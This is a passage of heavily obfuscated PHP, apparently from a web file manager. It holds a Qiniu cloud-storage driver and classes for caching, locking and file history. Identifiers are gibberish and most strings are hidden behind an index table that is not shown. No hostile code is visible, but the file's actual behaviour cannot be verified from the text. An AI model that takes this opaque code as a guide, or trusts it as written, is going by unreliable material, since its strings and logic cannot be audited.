$Ù¹î±ı; $this->cacheMethodInfoSet($Ù¹î±ı, !0); } if ($èŸš ±¦ === $¥µ¯¨€¢[12]) { break; } } $this->cacheMethodInfoSet($ã€ ø†±, !0); return array($¥µ¯¨€¢[82] => $—Š¼Ã©, $¥µ¯¨€¢[83] => $Üú½¶Éê); } public function canRead($¸›ƒ¬¸µ) { return $this->exist($¸›ƒ¬¸µ) ? !0 : !1; } public function canWrite($¯ŠŸã°ê) { return $this->exist($¯ŠŸã°ê) ? !0 : !1; } public function getContent($Ï Ô›ùµ) { return $this->fileSubstr($Ï Ô›ùµ, 0, -1); } public function setContent($»ğ÷ç¤‚, $Áİµ ËÍ = '') { $©ÇÇ•ò = $this->tempFile($this->pathThis($»ğ÷ç¤‚)); file_put_contents($©ÇÇ•ò, $Áİµ ËÍ); if ($this->upload($»ğ÷ç¤‚, $©ÇÇ•ò)) { $this->tempFileRemve($©ÇÇ•ò); return !0; } return !1; } public function refreshUrls($¼©ó š) { $ÍÖîöÅ =& $_SERVER[ Ö‘ñÄ”]; $ÖÈ¨Ó–· = array(); if (is_array($¼©ó š)) { foreach ($¼©ó š as $ïƒšÙ‘’) { $ÖÈ¨Ó–·[] = $this->link($ïƒšÙ‘’); } } else { $ÖÈ¨Ó–·[] = $this->link($¼©ó š); } $¹“û×Ì© = new Qiniu\Cdn\CdnManager($this->auth); list($æ‘üøã¹, $ÀõÕÊ×í) = $¹“û×Ì©->refreshUrls($ÖÈ¨Ó–·); if ($ÀõÕÊ×í) { return !1; } return $æ‘üøã¹[$ÍÖîöÅ[1189]] == $ÍÖîöÅ[773] ? !0 : !1; } public function fileSubstr($ğ“ØŞù, $‰äùØ¥Â, $—¼†ç–) { $†°À•úé =& $_SERVER[ Ö‘ñÄ”]; if (!($Ê¼²åÉŸ = $this->link($ğ“ØŞù))) { return !1; } $“—Ğ®Üó = !1; if ($—¼†ç– > 0) { $ŒñÚ‰˜ = $‰äùØ¥Â + $—¼†ç– - 1; $“—Ğ®Üó = array($†°À•úé[1438] . $‰äùØ¥Â . $†°À•úé[394] . $ŒñÚ‰˜); } $Ñ¹³òµ = url_request($Ê¼²åÉŸ, $†°À•úé[230], !1, $“—Ğ®Üó); return $Ñ¹³òµ[$†°À•úé[763]] ? $Ñ¹³òµ[$†°À•úé[1199]] : !1; } public function upload($™ƒÓ™¥é, $Úöµ©ß¡, $ûıïÍªé = false, $ÈÔùİä÷ = REPEAT_REPLACE) { $¬¾˜²éÍ = new Qiniu\Storage\UploadManager(); $ÜäØ”â¢ = $this->auth->uploadToken($this->bucket, $™ƒÓ™¥é); $£Ó‚¾óÀ = get_file_mime(get_path_ext($Úöµ©ß¡)); list($’ÙëŸÅ·, $¿†ç¼Áİ) = $¬¾˜²éÍ->putFile($ÜäØ”â¢, $™ƒÓ™¥é, $Úöµ©ß¡, null, $£Ó‚¾óÀ); return $¿†ç¼Áİ ? !1 : $this->getPathOuter($™ƒÓ™¥é); } public function uploadFormData($Ü¨Ö€â , $¸ı› €ú = 3600) { return $this->uploadToken($Ü¨Ö€â , $¸ı› €ú); } public function multiUploadFormData($ò˜§×øÜ, $Æùƒµ¬œ = 3600) { return $this->uploadToken($ò˜§×øÜ, $Æùƒµ¬œ); } private function uploadToken($íŞ·ä•ó, $µáÉ´˜È = 3600) { $Çø¸×¡ò =& $_SERVER[ Ö‘ñÄ”]; $ñÏĞ· = $µáÉ´˜È; $÷£Şğ§È = array($Çø¸×¡ò[1439] => $Çø¸×¡ò[1440]); $æê–¤Õ® = $íŞ·ä•ó; $ÚÎ¬Õ‡½ = $this->auth->uploadToken($this->bucket, $æê–¤Õ®, $ñÏĞ·, $÷£Şğ§È, !0); $÷ÚÆ¿ = empty($this->region) || $this->region == $Çø¸×¡ò[1441] ? $Çø¸×¡ò[12] : $Çø¸×¡ò[394] . $this->region; $™¬«ë¥² = http_type() . "\x3a\57\57\x75\x70\154\x6f\141\144{$÷ÚÆ¿}\x2e\x71\151\156\x69\x75\160\56\x63\x6f\155\x2f"; return array($Çø¸×¡ò[1442] => $ÚÎ¬Õ‡½, $Çø¸×¡ò[1443] => $™¬«ë¥²); } public function download($¹û–ãû°, $”ŸØĞµÅ) { $ô‘ßåë³ = IO::getPathInner(IO::mkfile($”ŸØĞµÅ)); if (!($ËË·ÛÖó = $this->link($¹û–ãû°))) { return !1; } $¥„éá°Ë = 0; $‡û®¡‡Ó = 1024 * 200; $ãÒØÄ÷ß = fopen($ô‘ßåë³, $_SERVER[ Ö‘ñÄ”][1444]); while (!0) { $¼„úéºİ = $this->fileSubstr($¹û–ãû°, $¥„éá°Ë, $‡û®¡‡Ó); if ($¼„úéºİ === !1) { return !1; } fwrite($ãÒØÄ÷ß, $¼„úéºİ); $¥„éá°Ë += $‡û®¡‡Ó; if (strlen($¼„úéºİ) < $‡û®¡‡Ó) { break; } } fclose($ãÒØÄ÷ß); return $”ŸØĞµÅ; } public function link($ÛƒªéÙ…, $“ÌàÂ«¨ = '') { if (!$this->isFile($ÛƒªéÙ…)) { return !1; } $´ƒÛŸğ£ = $this->getHost() . $_SERVER[ Ö‘ñÄ”][8] . $this->pathEncode($ÛƒªéÙ…) . $“ÌàÂ«¨; return $this->auth->privateDownloadUrl($´ƒÛŸğ£, 3600 * 12); } public function fileOut($õª«ŞÄ«, $„¼Àº¿‹ = false, $Ğª™ä«Ã = false, $ºÑ‘Šæ› = '') { $íÚıíùï =& $_SERVER[ Ö‘ñÄ”]; if ($this->isFileOutServer()) { return $this->fileOutServer($õª«ŞÄ«, $„¼Àº¿‹, $Ğª™ä«Ã, $ºÑ‘Šæ›); } if (!$Ğª™ä«Ã) { $Ğª™ä«Ã = $this->pathThis($õª«ŞÄ«); } $Çí•Œ³ö = $„¼Àº¿‹ ? $íÚıíùï[1445] . rawurlencode($Ğª™ä«Ã) : $íÚıíùï[12]; $¬€ù¢ = $this->link($õª«ŞÄ«, $Çí•Œ³ö); $this->fileOutLink($¬€ù¢); } public function fileOutServer($ï‚ö‚ş›, $×áèÂ¾â = false, $×ü·µÅí = false, $§Íª²Ó¹ = '') { parent::fileOut($ï‚ö‚ş›, $×áèÂ¾â, $×ü·µÅí, $§Íª²Ó¹); } public function fileOutImage($ª´«¾‹ì, $’”ïÜ°Á = 250) { $‚äüÕÉƒ = $this->link($ª´«¾‹ì, $_SERVER[ Ö‘ñÄ”][1446] . $’”ïÜ°Á); $this->fileOutLink($‚äüÕÉƒ); } public function fileOutImageServer($ïÊ¾±ñá, $…æ ë£ó = 250) { parent::fileOutImage($ïÊ¾±ñá, $…æ ë£ó); } public function hashMd5($¶å†â‡) { $Ğµõ¾¶ß =& $_SERVER[ Ö‘ñÄ”]; $ââ‚œùÕ = $this->objectMeta($¶å†â‡); return isset($ââ‚œùÕ[$Ğµõ¾¶ß[212]]) ? $ââ‚œùÕ[$Ğµõ¾¶ß[212]] : !1; $ê«©ä½ú = $this->link($¶å†â‡, $Ğµõ¾¶ß[1447]); } public function size($ß•Æ¿èœ) { $­ù–ø„ï = $this->objectMeta($ß•Æ¿èœ); return $­ù–ø„ï ? $­ù–ø„ï[$_SERVER[ Ö‘ñÄ”][76]] : 0; } public function info($â¨ÁäÅ¸) { if ($this->isFolder($â¨ÁäÅ¸)) { return $this->folderInfo($â¨ÁäÅ¸); } else { if ($this->isFile($â¨ÁäÅ¸)) { return $this->fileInfo($â¨ÁäÅ¸); } } return !1; } public function exist($û¥Ë‘¹„) { return $this->isFile($û¥Ë‘¹„) || $this->isFolder($û¥Ë‘¹„); } public function isFile($Å™—µÛÔ) { return !$this->isFolder($Å™—µÛÔ) && $this->objectMeta($Å™—µÛÔ); } public function isFolder($ª•ë­´„) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][165], $ª•ë­´„); } protected function objectMeta($§°Ğ½ø¦) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][167], $§°Ğ½ø¦); } protected function _objectMeta($ø“Ñ¥·) { $›Ø•Ş¡ó =& $_SERVER[ Ö‘ñÄ”]; list($ƒ£æ‚ëš, $Ô‡˜…) = $this->bucketManager->stat($this->bucket, $ø“Ñ¥·); if ($ƒ£æ‚ëš) { $ƒ£æ‚ëš[$›Ø•Ş¡ó[76]] = intval($ƒ£æ‚ëš[$›Ø•Ş¡ó[1433]]); } return $ƒ£æ‚ëš; } protected function _isFolder($åĞßØÁŠ) { $³Ë¯–®û =& $_SERVER[ Ö‘ñÄ”]; if ($åĞßØÁŠ == $³Ë¯–®û[12] || $åĞßØÁŠ == $³Ë¯–®û[8]) { return !0; } list($õ…®ì, $¶½ìŒ¬ä) = $this->bucketManager->listFiles($this->bucket, trim($åĞßØÁŠ, $³Ë¯–®û[8]) . $³Ë¯–®û[8], $³Ë¯–®û[12], 1, $³Ë¯–®û[8]); return !empty($õ…®ì[$³Ë¯–®û[1436]]) || !empty($õ…®ì[$³Ë¯–®û[1437]]) ? !0 : !1; } } goto déï‚ğù†Õ; C“¬°Ú¨¿¤: class Cache { protected static $handle; protected static $memoryCache; public static function init() { $…×ùï¨ =& $_SERVER[ Ö‘ñÄ”]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $¸ù¢Ûğç = $GLOBALS[$…×ùï¨[6]][$…×ùï¨[358]]; $¯åÚòÛç = $¸ù¢Ûğç[$¸ù¢Ûğç[$…×ùï¨[840]]]; $â²¨¸éÅ = $¸ù¢Ûğç[$…×ùï¨[841]]; switch ($¸ù¢Ûğç[$…×ùï¨[840]]) { case $…×ùï¨[21]: self::$handle = Model($…×ùï¨[842]); break; case $…×ùï¨[843]: self::$handle = new CacheRedis($¯åÚòÛç, $â²¨¸éÅ); break; case $…×ùï¨[844]: self::$handle = new CacheMemcached($¯åÚòÛç, $â²¨¸éÅ); break; case $…×ùï¨[199]: self::$handle = new CacheFile($¯åÚòÛç, $â²¨¸éÅ); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($ú…Æœ‹ñ) { if (is_array($ú…Æœ‹ñ) || is_object($ú…Æœ‹ñ)) { $ú…Æœ‹ñ = json_encode($ú…Æœ‹ñ); } $ú…Æœ‹ñ = rawurlencode($ú…Æœ‹ñ); return md5(KOD_SITE_ID . $_SERVER[ Ö‘ñÄ”][11] . $ú…Æœ‹ñ); } public static function get($×«Ü—Ç¤, $º‘Ü·«– = false) { $Ü¦ÀÍúô = self::key($×«Ü—Ç¤); if ($º‘Ü·«–) { return unserialize(self::init()->get($Ü¦ÀÍúô)); } if (!isset(self::$memoryCache[$Ü¦ÀÍúô])) { $µâ»›˜ = self::init()->get($Ü¦ÀÍúô); self::$memoryCache[$Ü¦ÀÍúô] = unserialize($µâ»›˜); } return self::$memoryCache[$Ü¦ÀÍúô]; } public static function set($«ÚËòÒÍ, $Î†æ¹¥¹, $Í¯º³á± = false) { $ÏæºË = self::key($«ÚËòÒÍ); if (isset(self::$memoryCache[$ÏæºË]) && self::$memoryCache[$ÏæºË] === $Î†æ¹¥¹) { return !0; } if ($Í¯º³á± === 0) { self::$memoryCache[$ÏæºË] = $Î†æ¹¥¹; return !0; } CacheLock::lock($«ÚËòÒÍ); $Í§£‘Ãğ = self::init()->set($ÏæºË, serialize($Î†æ¹¥¹), $Í¯º³á±); self::$memoryCache[$ÏæºË] = $Î†æ¹¥¹; CacheLock::unlock($«ÚËòÒÍ); return $Í§£‘Ãğ; } public static function getCall($–âá©¸, $„ûË´Š, $•¿ğå—Ú, $öÄßá§ú = array()) { $’×Ÿš© =& $_SERVER[ Ö‘ñÄ”]; $šëšë×‰ = self::get($–âá©¸); if ($šëšë×‰ || $šëšë×‰ === $’×Ÿš©[12]) { return $šëšë×‰; } $šëšë×‰ = call_user_func_array($•¿ğå—Ú, $öÄßá§ú); $šëšë×‰ = $šëšë×‰ ? $šëšë×‰ : $’×Ÿš©[12]; self::set($–âá©¸, $šëšë×‰, $„ûË´Š); return $šëšë×‰; } public static function remove($˜­ïÙî) { $å„ºÏ¶« = self::key($˜­ïÙî); unset(self::$memoryCache[$å„ºÏ¶«]); self::clearTimeout(); CacheLock::lock($˜­ïÙî); $äëÄ£×Æ = self::init()->remove($å„ºÏ¶«); CacheLock::unlock($˜­ïÙî); return $äëÄ£×Æ; } public static function removeMemory($§øÖÆ™) { $äÒã«õ° = self::key($§øÖÆ™); unset(self::$memoryCache[$äÒã«õ°]); } public static function clearMemory($¤¾½…¦ = false) { if ($¤¾½…¦) { $¤¾½…¦ = self::key($¤¾½…¦); unset(self::$memoryCache[$¤¾½…¦]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[ Ö‘ñÄ”][845])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[ Ö‘ñÄ”][846])) { self::init()->clearTimeout(); } } } class CacheFile { public $cachePath; public $prefix; public $cacheTime; public function __construct($Ÿæ©û×‘, $£ß„ùÚ) { $ùú”ãéÀ =& $_SERVER[ Ö‘ñÄ”]; $this->cachePath = $Ÿæ©û×‘[$ùú”ãéÀ[84]]; $this->prefix = $ùú”ãéÀ[847]; $this->cacheTime = $£ß„ùÚ; if (!file_exists($this->cachePath)) { mkdir($this->cachePath, DEFAULT_PERRMISSIONS, !0); } } public function getFile($×·Á–Óª) { $¡»İÃ¯ =& $_SERVER[ Ö‘ñÄ”]; $×·Á–Óª = str_replace(array($¡»İÃ¯[848], $¡»İÃ¯[97], $¡»İÃ¯[73]), $¡»İÃ¯[849], $×·Á–Óª); return $this->cachePath . $¡»İÃ¯[850] . $×·Á–Óª . $¡»İÃ¯[851]; } public function set($ÑäÍ÷£õ, $–µœ’Ã, $‡õ¿Í ’ = false) { $ÒÖà­¥‹ = $this->getFile($ÑäÍ÷£õ); if (file_put_contents($ÒÖà­¥‹, $this->prefix . $–µœ’Ã, LOCK_EX)) { @touch($ÒÖà­¥‹, intval(time() + $‡õ¿Í ’)); clearstatcache(); return !0; } @unlink($ÒÖà­¥‹); return !1; } public function get($×í¸İÚ–) { $Ø ©Ÿµ = $this->getFile($×í¸İÚ–); if (file_exists($Ø ©Ÿµ) && filemtime($Ø ©Ÿµ) < time()) { @unlink($Ø ©Ÿµ); return !1; } $±¯·¢Øé = @file_get_contents($Ø ©Ÿµ); return substr($±¯·¢Øé, strlen($this->prefix)); } public function remove($‹€úÈı) { $”ÂÆæà… = $this->getFile($‹€úÈı); return @unlink($”ÂÆæà…); } public function deleteAll() { $ÂÎ“ÅÄ =& $_SERVER[ Ö‘ñÄ”]; $®»·ÜµÈ = scandir($this->cachePath); foreach ($®»·ÜµÈ as $ôôĞÂÈ™) { $ÈĞØõŒÖ = $this->cachePath . $ôôĞÂÈ™; if (strpos($ÈĞØõŒÖ, $ÂÎ“ÅÄ[851]) && strpos($ÈĞØõŒÖ, $ÂÎ“ÅÄ[852])) { @unlink($ÈĞØõŒÖ); } } } public function clearTimeout() { $Ààüõ¼ =& $_SERVER[ Ö‘ñÄ”]; $í‡»ó·¥ = scandir($this->cachePath); foreach ($í‡»ó·¥ as $üÊÅöø) { $ºòáÀá– = $this->cachePath . $üÊÅöø; if (strpos($ºòáÀá–, $Ààüõ¼[851]) && strpos($ºòáÀá–, $Ààüõ¼[852]) && filemtime($ºòáÀá–) < time()) { @unlink($ºòáÀá–); } } } } class CacheLock { protected static $handle; protected static $timeout; protected static $errorMsg = ''; protected static $lockItem = array(); public static function init() { $×˜ÛœÎâ =& $_SERVER[ Ö‘ñÄ”]; if (self::$handle) { return self::$handle; } $‰À­¢¼Ú = $GLOBALS[$×˜ÛœÎâ[6]][$×˜ÛœÎâ[358]]; self::$timeout = $‰À­¢¼Ú[$×˜ÛœÎâ[853]] ? $‰À­¢¼Ú[$×˜ÛœÎâ[853]] : 10; $¶†ô¶ç¥ = _get($GLOBALS[$×˜ÛœÎâ[6]], $×˜ÛœÎâ[854]); $™„û£ö˜ = $‰À­¢¼Ú[$×˜ÛœÎâ[840]] ? $‰À­¢¼Ú[$×˜ÛœÎâ[840]] : $×˜ÛœÎâ[199]; if ($™„û£ö˜ == $×˜ÛœÎâ[21] && $¶†ô¶ç¥ == $×˜ÛœÎâ[13]) { $™„û£ö˜ = $×˜ÛœÎâ[199]; } switch ($™„û£ö˜) { case $×˜ÛœÎâ[843]: self::$handle = new CacheLockRedis(); break; case $×˜ÛœÎâ[844]: self::$handle = new CacheLockMemcached(); break; case $×˜ÛœÎâ[21]: self::$handle = new CacheLockDatabase(); break; case $×˜ÛœÎâ[199]: self::$handle = new CacheLockFile(); break; default: break; } if (GLOBAL_DEBUG_LOG_ALL) { write_log($×˜ÛœÎâ[855], $×˜ÛœÎâ[856]); } return self::$handle; } private static function key($ÅÖİÀÎ÷) { return $_SERVER[ Ö‘ñÄ”][857] . Cache::key($ÅÖİÀÎ÷); } public static function initReset() { self::$handle = !1; } public static function setErrorMsg($çâû‘­Í = '') { self::$errorMsg = $çâû‘­Í; } public static function lockGlobal($Àë’•¥„, $ÎïîÛèú) { return self::lock($Àë’•¥„, $ÎïîÛèú, !0); } public static function lock($·ìçáäÜ, $ÒŞâí„Ì = false, $Ç¡¬şÖì = false) { $Ó˜¡šÑ¾ =& $_SERVER[ Ö‘ñÄ”]; $‘ÓÎÅÉ = self::init(); $Áß™­Û = self::key($·ìçáäÜ); $ÒŞâí„Ì = $ÒŞâí„Ì ? $ÒŞâí„Ì : self::$timeout; $‘‰±ñ‡Ò = $‘ÓÎÅÉ->lock($Áß™­Û, $ÒŞâí„Ì); $›¶İ”†Ï = timeFloat(); if (!$‘‰±ñ‡Ò) { $Ãõ°İæé = "\154\x6f\x63\153\x20\145\162\x72\157\x72\x3b\x6b\145\x79\x3d{$·ìçáäÜ}\73\x74\151\x6d\145\x3d{$ÒŞâí„Ì}\73" . self::$errorMsg . $Ó˜¡šÑ¾[71] . get_caller_msg(); $§Ù¹‡Û = LNG($Ó˜¡šÑ¾[858]) . "\50{$ÒŞâí„Ì}\163\x29\x2e" . LNG($Ó˜¡šÑ¾[859]); $§Ù¹‡Û .= $Ó˜¡šÑ¾[860]; if (is_string(self::$errorMsg) && self::$errorMsg) { $§Ù¹‡Û = $§Ù¹‡Û . $Ó˜¡šÑ¾[861] . self::$errorMsg; } write_log($Ãõ°İæé, $Ó˜¡šÑ¾[856]); show_json($§Ù¹‡Û, !1); } if (!$Ç¡¬şÖì) { self::$lockItem[$Áß™­Û] = !0; } if (GLOBAL_DEBUG_LOG_ALL) { $Ï®ÄÎÛ = number_format(timeFloat() - $›¶İ”†Ï, 3); write_log($Ó˜¡šÑ¾[862] . $·ìçáäÜ . $Ó˜¡šÑ¾[863] . $Ï®ÄÎÛ, $Ó˜¡šÑ¾[856]); } return $‘‰±ñ‡Ò; } public static function lockGet($¹íÂÛ›) { $±”àı§ = self::key($¹íÂÛ›); if (self::$lockItem[$±”àı§]) { return self::$lockItem[$±”àı§]; } return self::init()->lockGet($±”àı§); } public static function unlock($Ö•ûˆ±) { $“±²éİë =& $_SERVER[ Ö‘ñÄ”]; $¬—ëƒ = self::key($Ö•ûˆ±); self::$lockItem[$¬—ëƒ] = null; self::init()->unlock($¬—ëƒ); if (GLOBAL_DEBUG_LOG_ALL) { write_log($“±²éİë[864] . $Ö•ûˆ±, $“±²éİë[856]); } return; } public static function unlockRuntime() { $ø¯ø’úı =& $_SERVER[ Ö‘ñÄ”]; $Ù§Ë¡‚ş = self::init(); $Ú¥Ë‚ŠÕ = !1; foreach (self::$lockItem as $°‚Ú¢Ø => $¢·ò¶Î) { if (!$¢·ò¶Î) { continue; } $Ù§Ë¡‚ş->unlock($°‚Ú¢Ø); if (!$Ú¥Ë‚ŠÕ) { $Ú¥Ë‚ŠÕ = !0; write_log($ø¯ø’úı[865] . $°‚Ú¢Ø . $ø¯ø’úı[71] . get_caller_msg(), $ø¯ø’úı[856]); continue; } write_log($ø¯ø’úı[865] . $°‚Ú¢Ø, $ø¯ø’úı[856]); } self::fileUnlockAll(); if (GLOBAL_DEBUG_LOG_ALL) { $âæÜ§Õ = number_format(timeFloat() - TIME_FLOAT, 3); write_log($ø¯ø’úı[866] . $âæÜ§Õ . $ø¯ø’úı[867] . ACTION, $ø¯ø’úı[856]); } } public static function fileLock($âÊ¤†œÂ) { $öûµ»øş =& $_SERVER[ Ö‘ñÄ”]; if (!$GLOBALS[$öûµ»øş[868]]) { $GLOBALS[$öûµ»øş[868]] = array(); } $GLOBALS[$öûµ»øş[868]][$âÊ¤†œÂ] = !1; $¯¬½™Ò¬ = fopen(DATA_PATH . $âÊ¤†œÂ . $öûµ»øş[869], $öûµ»øş[870]); if (!$¯¬½™Ò¬) { return !1; } $GLOBALS[$öûµ»øş[868]][$âÊ¤†œÂ] = $¯¬½™Ò¬; if (flock($¯¬½™Ò¬, LOCK_EX)) { return !0; } self::unlock($âÊ¤†œÂ); show_json($öûµ»øş[871], !1); return !1; } public static function fileUnlock($ĞÒæ¶ë) { $°´óôß“ =& $_SERVER[ Ö‘ñÄ”]; $¼Ü—¸¤ú = $GLOBALS[$°´óôß“[868]][$ĞÒæ¶ë]; if (!$¼Ü—¸¤ú) { return; } $GLOBALS[$°´óôß“[868]][$ĞÒæ¶ë] = !1; flock($¼Ü—¸¤ú, LOCK_UN); fclose($¼Ü—¸¤ú); } public static function fileUnlockAll() { $ÊúÂ®úë =& $_SERVER[ Ö‘ñÄ”]; if (!$GLOBALS[$ÊúÂ®úë[868]]) { return; } foreach ($GLOBALS[$ÊúÂ®úë[868]] as $ş³Šìˆ¯ => $ßºô¦Şª) { if (!$ßºô¦Şª) { continue; } $GLOBALS[$ÊúÂ®úë[868]][$ş³Šìˆ¯] = !1; flock($ßºô¦Şª, LOCK_UN); fclose($ßºô¦Şª); } $GLOBALS[$ÊúÂ®úë[868]] = array(); } } goto f“ÊÚ¤îÀ; BÏÎÑ«‘Ææ: class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $æ çğà =& $_SERVER[ Ö‘ñÄ”]; $½…Ö„©Ù = $GLOBALS[$æ çğà[6]][$æ çğà[89]]; if ($½…Ö„©Ù[$æ çğà[1214]] != 1) { return; } if ($½…Ö„©Ù[$æ çğà[1215]] <= 0) { return; } if (isset($_REQUEST[$æ çğà[1216]]) && $_REQUEST[$æ çğà[1216]] == $æ çğà[88]) { return; } Hook::bind($æ çğà[1217], $æ çğà[1218]); Hook::bind($æ çğà[1219], $æ çğà[1220]); Hook::bind($æ çğà[1221], $æ çğà[1222]); Hook::bind($æ çğà[1223], $æ çğà[1224]); Hook::bind($æ çğà[1225], $æ çğà[1226]); Hook::bind($æ çğà[1227], $æ çğà[1228]); } public static function eventBeforeUpload($ñƒ’Õıû) { if ($ñƒ’Õıû[3] && $ñƒ’Õıû[3] != REPEAT_REPLACE) { return; } $ó¢©¨¿ = self::parsePath($ñƒ’Õıû[0]); if (!$ó¢©¨¿) { return; } self::add($ó¢©¨¿); } public static function eventBeforeEdit($ûøëôÃ) { $¹ĞŒ„ = self::parsePath($ûøëôÃ[0]); if (!$¹ĞŒ„) { return; } self::add($¹ĞŒ„); } public static function eventBeforeCopyFile($”‘èØŒ, $Í”ûÃüß, $‹û©Ò’“, $ı·éñËÎ, $©Å°ÀÅ¸, $÷®Í¾ Å) { $®Ì±¹„ =& $_SERVER[ Ö‘ñÄ”]; if (isset($‹û©Ò’“->_data[$®Ì±¹„[1161]]) && $‹û©Ò’“->_data[$®Ì±¹„[1161]]) { return; } $ßâó¤ê± = $‹û©Ò’“->getPathOuter($ı·éñËÎ); $¬´•¯ = self::parsePath($ßâó¤ê±); if (!$¬´•¯) { return; } self::add($¬´•¯); } public static function eventBeforeRename($Îè÷¹‚Ú) { $ı÷®©ì =& $_SERVER[ Ö‘ñÄ”]; $ÉÕú™¤ç = self::parsePath($Îè÷¹‚Ú[0]); if (!$ÉÕú™¤ç) { return; } $Ù÷Åï„Ë = self::checkInHistory($ÉÕú™¤ç); if (!$Ù÷Åï„Ë) { return; } if ($Ù÷Åï„Ë[$ı÷®©ì[33]] == $ı÷®©ì[199]) { $‘¹‡ü¯  = self::listData($ÉÕú™¤ç); if ($‘¹‡ü¯  && $‘¹‡ü¯ [$ı÷®©ì[378]]) { self::moveHistory($ÉÕú™¤ç, $Îè÷¹‚Ú[1]); } } else { IO::rename($Ù÷Åï„Ë[$ı÷®©ì[84]], $Îè÷¹‚Ú[1]); } } public static function eventBeforeMove($äĞ¸ÖÇİ) { $çÜùë¿ =& $_SERVER[ Ö‘ñÄ”]; $Š¸Ğşíõ = self::parsePath($äĞ¸ÖÇİ[0]); if (!$Š¸Ğşíõ) { return; } $€œ¯‰±ú = self::parsePath($äĞ¸ÖÇİ[1]); if (!$€œ¯‰±ú) { return; } $´¼ôĞ„ã = $äĞ¸ÖÇİ[3]; $Ø‹Ê¦à¢ = self::checkInHistory($Š¸Ğşíõ); if (!$Ø‹Ê¦à¢) { return; } $”õà€ ¦ = self::pathHistory($€œ¯‰±ú); if ($Ø‹Ê¦à¢[$çÜùë¿[33]] == $çÜùë¿[199]) { $³Ì‹öÔÎ = self::listData($Š¸Ğşíõ); $¬Æ¯¡ÇÑ = rtrim($€œ¯‰±ú, $çÜùë¿[8]) . $çÜùë¿[8] . ($´¼ôĞ„ã ? $´¼ôĞ„ã : get_path_this($Š¸Ğşíõ)); $ –¨Ù”Û = self::listData($¬Æ¯¡ÇÑ); if ($³Ì‹öÔÎ && $³Ì‹öÔÎ[$çÜùë¿[378]] && $ –¨Ù”Û && $ –¨Ù”Û[$çÜùë¿[378]]) { return self::clear($Š¸Ğşíõ); } if ($³Ì‹öÔÎ && $³Ì‹öÔÎ[$çÜùë¿[378]]) { self::moveHistory($Š¸Ğşíõ, $´¼ôĞ„ã, $”õà€ ¦); } } else { IO::move($Ø‹Ê¦à¢[$çÜùë¿[84]], $”õà€ ¦, !1, $´¼ôĞ„ã); self::clearEmptyFolder(IO::pathFather($Ø‹Ê¦à¢[$çÜùë¿[84]])); } } public static function eventAfterRemove($º©Ô»Æ¬, $¡öÉ¢ÔÃ) { $Æ Ş´Ëê =& $_SERVER[ Ö‘ñÄ”]; if (!$¡öÉ¢ÔÃ) { return; } $«ÍîÙÅ = self::parsePath($º©Ô»Æ¬[0]); if (!$«ÍîÙÅ) { return; } $îÃëşÃî = self::checkInHistory($«ÍîÙÅ); if (!$îÃëşÃî) { return; } if ($îÃëşÃî[$Æ Ş´Ëê[33]] == $Æ Ş´Ëê[199]) { $Ù˜¥ŒŠÌ = self::listData($«ÍîÙÅ, !1); if ($Ù˜¥ŒŠÌ && $Ù˜¥ŒŠÌ[$Æ Ş´Ëê[378]]) { self::clear($«ÍîÙÅ, !1); } } else { IO::remove($îÃëşÃî[$Æ Ş´Ëê[84]]); self::clearEmptyFolder(IO::pathFather($îÃëşÃî[$Æ Ş´Ëê[84]])); } } private static function checkInHistory($³’ŞÔ•) { $ŸÇš³ø¤ = self::pathHistory($³’ŞÔ•); if (!IO::exist($ŸÇš³ø¤)) { $ŸÇš³ø¤ .= $_SERVER[ Ö‘ñÄ”][1229]; } return IO::exist($ŸÇš³ø¤) ? IO::info($ŸÇš³ø¤) : !1; } private static function parsePath($ÌŠ³»¤) { $“¦ˆ¾¿ú =& $_SERVER[ Ö‘ñÄ”]; if (!$ÌŠ³»¤) { return !1; } if ($GLOBALS[$“¦ˆ¾¿ú[1230]]) { return; } $ú¬¥ˆ÷é = KodIO::parse($ÌŠ³»¤); $ê“­—’ = $ú¬¥ˆ÷é[$“¦ˆ¾¿ú[33]]; $–¡Ø‘Şø = !$ê“­—’ || $ê“­—’ == KodIO::KOD_IO || $ê“­—’ == KodIO::KOD_SHARE_ITEM; if (!$–¡Ø‘Şø || !$ú¬¥ˆ÷é[$“¦ˆ¾¿ú[1231]]) { return !1; } if (substr($ÌŠ³»¤, 0, strlen(DATA_PATH . $“¦ˆ¾¿ú[1232])) == DATA_PATH . $“¦ˆ¾¿ú[1232]) { return !1; } if ($ê“­—’ == KodIO::KOD_SHARE_ITEM) { $ï™Êò = IO::init($ÌŠ³»¤); if ($ï™Êò->pathParse[$“¦ˆ¾¿ú[1157]]) { return self::parsePath($ï™Êò->pathParse[$“¦ˆ¾¿ú[1157]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $ï®Áßï´ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $“¦ˆ¾¿ú[1233]); foreach ($ï®Áßï´ as $éäâÅŠÈ) { if (!$ê“­—’ && substr($ÌŠ³»¤, 0, strlen($éäâÅŠÈ)) == $éäâÅŠÈ) { return !1; } } self::log($GLOBALS[$“¦ˆ¾¿ú[1152]] . $“¦ˆ¾¿ú[1234] . $ÌŠ³»¤); return $ÌŠ³»¤; } private static function pathHistory($ú€Ï—Ï) { $†”½‰“© =& $_SERVER[ Ö‘ñÄ”]; $“ëîŠ”¿ = self::$_historyBase . ltrim(KodIO::clear($ú€Ï—Ï), $†”½‰“©[8]); $“ëîŠ”¿ = str_replace(array($†”½‰“©[1235]), array($†”½‰“©[1236]), $“ëîŠ”¿); return $“ëîŠ”¿; } public static function log($şÎ¡…š) { } public static function historyCount($ªÃ¹úü») { $ÆÓ²âÆ =& $_SERVER[ Ö‘ñÄ”]; $úğˆ½ˆÍ = array(); $êôæ¬¦– = array(); foreach ($ªÃ¹úü» as $Ä‹âÌŞì) { $Ä”óãû = get_path_father($Ä‹âÌŞì); if (!$êôæ¬¦–[$Ä”óãû]) { $êôæ¬¦–[$Ä”óãû] = array(); } $êôæ¬¦–[$Ä”óãû][] = get_path_this($Ä‹âÌŞì); } foreach ($êôæ¬¦– as $Ä”óãû => $‘¿¼âç„) { $×ø´†è = 